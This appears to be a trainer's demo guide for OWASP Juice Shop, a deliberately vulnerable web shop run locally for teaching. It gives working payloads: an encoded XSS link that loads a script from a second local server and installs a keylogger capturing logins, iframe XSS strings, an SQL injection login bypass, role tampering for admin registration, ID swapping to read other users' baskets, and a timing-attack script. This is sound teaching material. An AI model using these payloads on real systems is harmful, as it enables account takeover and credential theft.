---
layout: default
---

# Setup :cd:

Configure and run a custom docker-based instance of juice-shop:

```
sudo docker run -ti --init --rm  -p 3000:3000 -p 8080:80 hugopacheco/juice-shop-demo

# python only required for the Timing attack demo
sudo apt-get -y install python3-pip
pip3 install requests statistics argparse
```

Install [Google Chrome](https://www.google.com/chrome/) and its [WebSpy](https://chrome.google.com/webstore/detail/webspy-explore-and-test-w/aedipmheomnpcbgmanofhaccebgapije?hl=en) extension.

Open the locally-hosted Juice Shop website (http://localhost:3000) with Chrome.

## FAQ :scroll:

* For multiple demos, killing and relaunching the docker container shall reset all progress.
* If the timing delays in the timing attack demo are not noticeable, you may increase the delay in milliseconds for each product search by setting the flag `SEARCH_DELAY` before launching the container, e.g. `export SEARCH_DELAY=100` sets the delay to 100ms. 

# Examples :rocket:

You can demonstrate these in order, or select a few at will.

## Score Board challenge :star:

<details>
<summary>More info</summary>

This challenge serves to explain the structure of web pages and to demonstrate how Juice Shop challenges work:

1. Explain how to use the browser's `Developer Tools`.
2. Then show how to find the score-board by inspecting the HTML and JavaScript code of the frontpage.
3. You will find the `score-board` as a `path` defined in file `main.js`. Go to the page `http://localhost:3000/#/score-board`.
4. When you solve a Juice Shop challenge, the site will greet you with a green notification.
5. Show the gamified challenges on the scoreboard. Reinforce that interested students can try to solve more challenges at home.
</details>
<p></p>

<details>
<summary>Questions</summary>

1. Which is the link to the scoreboard?
2. Is it secure to hide information in a web page? :eyes:
</details>
<p></p>

## Zero Stars challenge :star:

<details>
<summary>More info</summary>

Start by showing the unsolved challenge in the scoreboard and read the hints. 

Explain how to use WebSpy (under `Developer Tools > Spy`) to monitor the requests made by the browser to the Juice Shop website. Argue why this is the modus-operandi of many hackers.
Then show how to submit a zero-star review:

1. Do a regular action: posting a new comment in the *Customer Feedback* page.
2. You may check that your comment actually appears in the *About Us* page.
3. Replay a similar request with WebSpy to `/api/Feedbacks`, this time with `rating:0`.
4. Note that you will have to change increment the captcha id from the previous request. The new captcha will be shown in the response to the latest `/rest/captcha` request, and reloaded in the web interface.
</details>
<p></p>

<details>
<summary>Questions</summary>

1. Which is the link to the scoreboard?
2. Is it secure to hide information in a web page? :man_technologist:
</details>
<p></p>

## XSS demo :link:

<details>
<summary>More info</summary>

Showcase the XSS demo (more detailed instructions [here](https://pwning.owasp-juice.shop/appendix/trainers.html)):

1. Open the keylogger at (http://localhost:8080/logger.php).
2. Open this [link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp) in a new tab to start the XSS attack. Explain why following malicious links is a very common scenario. Your page will run some malicious JS that plays music and shakes to its sound, while it installs a keylogger.
3. Login as an existing user and see that the credentials are being recorded to the keylogger.
4. Refresh the web page to unload the attack script.
</details>
<p></p>

## Timing attack demo :hourglass_flowing_sand:

<details>
<summary>More info</summary>

This is a demo on how subtle timing differences may allow us to recover hidden information. This is not an actual Juice Shop challenge, but is inspired by the Christmas Special challenge :star: :star:.

1. Open up WebSpy and find the backend search request. You may notice that, independently of the search query in the frontend, the backend request is always `/rest/products/search?q=` with an empty query. (Product filtering is happening by default in the JS side.)
2. You can nonetheless replay the request and fill in the `q` argument with your own search term.
3. This is particularly interesting for search terms for which there are **no apparent** products. For example, the Christmas Special challenge invites us to search for an hidden *Christmas special offer of 2014*. We can use WebSpy to search for two different terms such as `christmas` and `personal`; they both return an empty match, but is there a noticeable difference in the time of the request? It does seem so...
4. After all, the server may take an arbitrary time to respond. We can further support our suspicions by repeating the same requests multiple times and checking if there is still a significant difference in the average times. Download this Python [script](demo/xs-search.py) to automate the search. Then run the script for our two search terms; you shall get something like this:

```
% python3 xs-search.py christmas
Namespace(QUERY='christmas', n=10, t='runtime', nextchar=None, host=['localhost:3000'])
<Response [200]>
{"status":"success","data":[]}
christmas 0.03077825400000438
```

```
% python3 xs-search.py personal
Namespace(QUERY='personal', n=10, t='runtime', nextchar=None, host=['localhost:3000'])
<Response [200]>
{"status":"success","data":[]}
christmas 0.007031379100000438
```

Why does `christmas` take longer than `personal`? Probably because the server is taking more time to compare the search term and prepare the results for products that exist, than for products that do not exist.

5. There does seem to exist some product with the word `christmas` in its name. How can we find its full name? We need to find more characters before and/or after the word `christmas`. An idea is to attempt several characters, and check if there is a measurable time difference. In the script, we are trying characters from `a` to `z` and from `0` to `9`; other special characters are captured by the `_` wildcard. We can configure this to search for a character before or after:

```
% python3 xs-search.py christmas --nextchar before
Namespace(QUERY='christmas', n=10, t='runtime', nextchar='before', host='localhost:3000')
christmasa 0.006191999999980908
christmasb 0.005347312500001863
...
christmas_ 0.004923229000007268
```

All characters seem to take roughly the same amount of time. This suggests that there is no character appearing before `christmas` in our hidden product.

```
% python3 xs-search.py christmas -nextchar after
Namespace(QUERY='christmas', n=10, t='runtime', nextchar='after', host=['localhost:3000'])
christmasa 0.008081472499761731
christmasb 0.008309272999875248
...
christmas_ 0.029330530500039458
```

It seems that the `_` wildcard takes longer, hence the next character after `christmas` is neither a letter nor a number, but it does seem to exist.

We can repeat this process one character at a time:

```
% python3 xs-search.py christmas_ --nextchar after
Namespace(QUERY='christmas_', n=10, t='runtime', nextchar='after', host=['localhost:3000'])
christmas_a 0.006253162499982864
...
christmas_s 0.029131466499995443
...
christmas__ 0.028724410000257196
```

It seems that `s` takes longer (actually, the same as the `_` wildcard which always matches), hence the word `christmas_s` is in the name of our product.

You can repeat this process 35 times, until a new specific character cannot be singled out. The name of the actual hidden product is `Christmas Super-Surprise-Box (2014 Edition)`. We are not trying to find all the characters to avoid searching a larger character space and to avoid mentioning special HTML character encodings.

</details>
<p></p>

## Confidential Document challenge :star:

<details>
<summary>More info</summary>

1. Check the *About Us* page and follow the linked FTP file (`/ftp/legal.md`).
2. Replay the request with WebSpy to list the parent directory (`/ftp/`).
3. Find the `acquisitions.md` file in the response a get the confidential file (`/ftp/acquisitions.md`)..
</details>
<p></p>

## DOM XSS challenge :star:

<details>
<summary>More info</summary>

1. Paste the JS script from the challenge (`<iframe src="javascript:alert(`xss`)">`) in the search field.
2. You will immediately see a XSS popup.
</details>
<p></p>

## Reflected XSS challenge :star: :star:

<details>
<summary>More info</summary>

1. Create some user and login.
2. Order some product (add some product to the basket, checkout, fill out all the payment information and place order), visit the *Order History* page and click *Track Order* on your order.
3. The link of your product's order information will have the structure `/#/track-result/new?id=7cb0-dd30e23740d08c54`
3. Attack the orders search feature by replacing your order id with the JS script from the challenge (`<iframe src="javascript:alert(`xss`)">`). You may need to refresh the page for the script to be actually executed.
</details>
<p></p>

## Admin Registration challenge :star: :star: :star:

<details>
<summary>More info</summary>

1. Register a new user and inspect the request/response in WebSpy.
2. Inspect the fields of the response, you shall see a field `role: customer`
3. Replay the request with `role:admin` to register a new user with admin privileges. Make sure to register a new user; registering a repeated user issues an error.
</details>
<p></p>

## Admin Section challenge :star: :star:

<details>
<summary>More info</summary>

1. You need to be logged in as a user with admin privileges (from previous challenge)
2. Find the admin page by inspecting the HTML and JavaScript using the Developer Tools.
3. You will find the `administration` page as a `path` defined in file `main.js`.
</details>
<p></p>

## Forged Review challenge :star: :star: :star:

<details>
<summary>More info</summary>

1. Submit a new review for some product, while logged in, and replay it with WebSpy.
2. Try changing the author information (the `author` field in the request is just a string, the user doesn't even need to be valid).
</details>
<p></p>

## Forged Feedback challenge :star: :star: :star:

<details>
<summary>More info</summary>

1. Submit a new comment in the *Customer Feedback* page, while logged in, and replay it with WebSpy.
2. Try changing the user information (changing the `UserId` field to some other random user id, e.g. `1`; the user's name in the comment is just a string unrelated to the actual user id).
</details>
<p></p>

##  View Basket challenge :star: :star:

<details>
<summary>More info</summary>

1. View your basket and replay the request with WebSpy for a different user. You may notice that the user id appears in the request link (`/rest/basket/<id>`).
2. Replay the request with WebSpy for some other user id (e.g., `1`).
</details>
<p></p>

## Login Admin challenge :star: :star:

<details>
<summary>More info</summary>

You can also try to break authentication by demonstrating how SQL injection works:

1. Search for user account name in the *About Us* page. You may notice that there are a few `****@juice-sh.op` accounts.
2. Since we trying to login as special user named admin, a good guess is to assume that his account name will be `admin@juice-sh.op`.
3. Go to the login page and demonstrate the SQL injection by typing `admin@juice-sh.op' --` in the `username` field and anything in the `password` field.
4. You may confirm that this user actually has administrator privileges by going to the `/#/administration` page.
</details>
<p></p>



